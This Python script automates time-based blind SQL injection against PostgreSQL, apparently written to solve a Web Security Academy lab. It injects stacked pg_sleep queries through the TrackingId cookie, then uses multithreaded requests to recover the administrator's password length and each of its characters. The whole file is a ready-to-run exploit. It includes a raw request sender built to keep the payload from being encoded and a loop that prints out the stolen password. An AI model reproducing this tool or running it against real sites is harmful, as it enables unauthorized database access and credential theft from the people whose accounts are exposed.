#!/usr/bin/env python3
"""
postgres_blind_sqli.py
Blind SQL Injection (PostgreSQL) - Time Based - Multithreaded
Author: Hasrat Afridi
"""

import requests
import urllib3
import sys
import time
import readline
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────
#   CONFIGURATION
# ─────────────────────────────────────────
CHARSET    = "0123456789abcdefghijklmnopqrstuvwxyz"
THREADS    = 1
MAX_LENGTH = 30
SLEEP_TIME = 5      # pg_sleep seconds
THRESHOLD  = 5    # response >= 4.5s = TRUE

# Global state for clean exit
password_so_far = ""
start_time      = None
pwd_length      = 0

# ─────────────────────────────────────────
#   BANNER
# ─────────────────────────────────────────
def banner():
    print("""
╔══════════════════════════════════════════════╗
║   PostgreSQL Time Based SQLi - LIGHTNING ⚡  ║
║   All 36 chars fired simultaneously          ║
║   Author : Hasrat Afridi                     ║
╚══════════════════════════════════════════════╝
    """)

# ─────────────────────────────────────────
#   CLEAN EXIT HANDLER
#   Handles Ctrl+C and SIGTERM gracefully
#   Shows partial password if found so far
# ─────────────────────────────────────────
def handle_exit(sig=None, frame=None):
    elapsed = round(time.time() - start_time, 2) if start_time else 0

    print("\n")

    if password_so_far:
        print(f"""
╔══════════════════════════════════════════╗
║         ⚠  INTERRUPTED BY USER          ║
╠══════════════════════════════════════════╣
║  Partial password : {password_so_far:<21}║
║  Characters found : {str(len(password_so_far)) + '/' + str(pwd_length):<21}║
║  Time elapsed     : {str(elapsed) + 's':<21}║
╚══════════════════════════════════════════╝
        """)
    else:
        print("""
╔══════════════════════════════════════════╗
║         ⚠  INTERRUPTED BY USER          ║
║         No characters found yet          ║
╚══════════════════════════════════════════╝
        """)

    print("[!] Exiting cleanly...\n")
    sys.exit(0)

# ─────────────────────────────────────────
#   USER INPUT
# ─────────────────────────────────────────
def get_inputs():
    print("[*] Enter target details\n")

    try:
        url = input("  [?] Lab URL (https://xxx.web-security-academy.net): ").strip()
        if not url.startswith("http"):
            print("  [!] URL must start with https://")
            sys.exit(1)

        tracking_id = input("  [?] TrackingId value (without payload)      : ").strip()
        session     = input("  [?] Session cookie value                     : ").strip()
        username    = input("  [?] Username (default: administrator)        : ").strip()

    except KeyboardInterrupt:
        print("\n\n[!] Input cancelled. Exiting...\n")
        sys.exit(0)

    if not username:
        username = "administrator"

    if not url or not tracking_id or not session:
        print("\n  [!] URL, TrackingId and Session cannot be empty")
        sys.exit(1)

    return url, tracking_id, session, username

# ─────────────────────────────────────────
#   RAW REQUEST SENDER
#   Uses PreparedRequest to prevent
#   requests library encoding %3b to %253b
# ─────────────────────────────────────────
def send_raw(url, cookie_str):
    """
    Send request with raw cookie header
    PreparedRequest prevents %3b → %253b encoding
    Returns response time in seconds
    """
    sess    = requests.Session()
    req     = requests.Request(
        "GET",
        url,
        headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "Accept"    : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
    )
    prepared                    = sess.prepare_request(req)
    prepared.headers["Cookie"]  = cookie_str  # force raw cookie

    t1 = time.time()
    sess.send(
        prepared,
        verify=False,
        timeout=15,
        allow_redirects=True
    )
    return time.time() - t1

# ─────────────────────────────────────────
#   EXACT MATCH CHECK (PostgreSQL)
#   Payload: TrackingId'%3bselect case when
#   (username='X' and substr(password,N,1)='C')
#   then pg_sleep(5) else pg_sleep(0) end from users--
#   Delay >= THRESHOLD = correct character
# ─────────────────────────────────────────
def check_exact(url, tracking_id, session, username, position, char):
    """
    Time based exact match
    Only correct char triggers pg_sleep delay
    Response >= THRESHOLD = match found
    """
    payload = (
        f"{tracking_id}'%3b"
        f"select case when "
        f"(username='{username}' and substring(password,{position},1)='{char}') "
        f"then pg_sleep({SLEEP_TIME}) else pg_sleep(0) "
        f"end from users--"
    )

    cookie_str = f"TrackingId={payload}; session={session}"

    try:
        elapsed = send_raw(url, cookie_str)
        return char if elapsed >= THRESHOLD else None

    except requests.exceptions.ConnectionError:
        print("\n  [!] Connection error - lab may have expired")
        handle_exit()
    except requests.exceptions.Timeout:
        # Timeout = pg_sleep triggered = match
        return char
    except Exception as e:
        print(f"\n  [!] Unexpected error: {e}")
        return None

# ─────────────────────────────────────────
#   LENGTH CHECK (PostgreSQL)
#   Sequential only - parallel breaks timing
#   Payload: length(password)=N
#   Delay >= THRESHOLD = correct length
# ─────────────────────────────────────────
def check_length(url, tracking_id, session, username, length):
    """
    Sequential length check
    Parallel requests interfere with pg_sleep timing
    Delay >= THRESHOLD = correct length
    """
    payload = (
        f"{tracking_id}'%3b"
        f"select case when "
        f"(username='{username}' and length(password)={length}) "
        f"then pg_sleep({SLEEP_TIME}) else pg_sleep(0) "
        f"end from users--"
    )

    cookie_str = f"TrackingId={payload}; session={session}"

    try:
        elapsed = send_raw(url, cookie_str)
        return elapsed >= THRESHOLD

    except requests.exceptions.Timeout:
        return True
    except Exception:
        return False

# ─────────────────────────────────────────
#   PASSWORD LENGTH DETECTION
#   Sequential - time based cant be parallel
#   Parallel requests break pg_sleep timing
# ─────────────────────────────────────────
def get_password_length(url, tracking_id, session, username):
    """
    Sequential length detection 1 to MAX_LENGTH
    Time based CANNOT be parallel
    """
    global pwd_length

    print("\n[*] Detecting password length (sequential)...")

    for length in range(1, MAX_LENGTH + 1):
        print(f"  [*] Trying length {length}...   ", end="\r")

        if check_length(url, tracking_id, session, username, length):
            pwd_length = length
            print(f"  [+] Password length found : {length}          ")
            return length

    print(f"  [!] Could not detect - defaulting to 20")
    pwd_length = 20
    return 20

# ─────────────────────────────────────────
#   FIND ONE CHARACTER - Multithreaded
#   All 36 chars fired simultaneously
#   Only correct char delays - first wins
# ─────────────────────────────────────────
def find_char(url, tracking_id, session, username, position):
    """
    Fire all 36 chars at same time
    Only correct char triggers pg_sleep
    All wrong chars return instantly
    First delayed response = correct char
    """
    try:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {
                executor.submit(
                    check_exact,
                    url, tracking_id, session, username, position, char
                ): char
                for char in CHARSET
            }

            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    for f in futures:
                        f.cancel()
                    return result

    except KeyboardInterrupt:
        handle_exit()

    return None

# ─────────────────────────────────────────
#   MAIN CRACKING LOOP
# ─────────────────────────────────────────
def crack_password(url, tracking_id, session, username):
    global password_so_far, start_time

    length = get_password_length(url, tracking_id, session, username)

    print(f"\n[*] Starting LIGHTNING extraction ({length} chars)...")
    print(f"    Target    : {username}")
    print(f"    Charset   : {CHARSET}")
    print(f"    Threads   : {THREADS} per position")
    print(f"    Sleep     : {SLEEP_TIME}s  Threshold: {THRESHOLD}s")
    print(f"\n    Press Ctrl+C anytime to stop\n")

    start_time = time.time()

    for position in range(1, length + 1):
        char = find_char(url, tracking_id, session, username, position)

        # Retry once if failed
        if char is None:
            print(f"\n  [!] Position {position} failed - retrying...")
            char = find_char(url, tracking_id, session, username, position)

        if char is None:
            print(f"\n  [!] Could not resolve position {position} - stopping")
            break

        password_so_far += char
        elapsed          = time.time() - start_time

        done    = "█" * position
        pending = "░" * (length - position)
        print(
            f"  [{done}{pending}] {position}/{length}"
            f"  char='{char}'  found={password_so_far}  ({elapsed:.1f}s)   ",
            end="\r"
        )

    print()
    return password_so_far

# ─────────────────────────────────────────
#   MAIN
# ─────────────────────────────────────────
def main():
    global start_time

    signal.signal(signal.SIGINT,  handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    banner()

    url, tracking_id, session, username = get_inputs()

    print(f"""
[*] Configuration:
    URL       : {url}
    Username  : {username}
    Tracking  : {tracking_id[:20]}...
    Session   : {session[:20]}...
    Threads   : {THREADS} per position
    DB        : PostgreSQL
    Method    : Time Based (pg_sleep)
    Sleep     : {SLEEP_TIME}s
    Threshold : {THRESHOLD}s
    Max Len   : {MAX_LENGTH}
    """)

    try:
        confirm = input("[?] Start cracking? (y/n): ").strip().lower()
    except KeyboardInterrupt:
        print("\n\n[!] Cancelled. Exiting...\n")
        sys.exit(0)

    if confirm != 'y':
        print("[!] Aborted.\n")
        sys.exit(0)

    start_time = time.time()
    password   = crack_password(url, tracking_id, session, username)
    total      = round(time.time() - start_time, 2)

    if password:
        print(f"""
╔══════════════════════════════════════════╗
║        ⚡ PASSWORD FOUND! ⚡             ║
╠══════════════════════════════════════════╣
║  Username : {username:<29}║
║  Password : {password:<29}║
║  Time     : {str(total) + 's':<29}║
╚══════════════════════════════════════════╝
        """)

if __name__ == "__main__":
    main()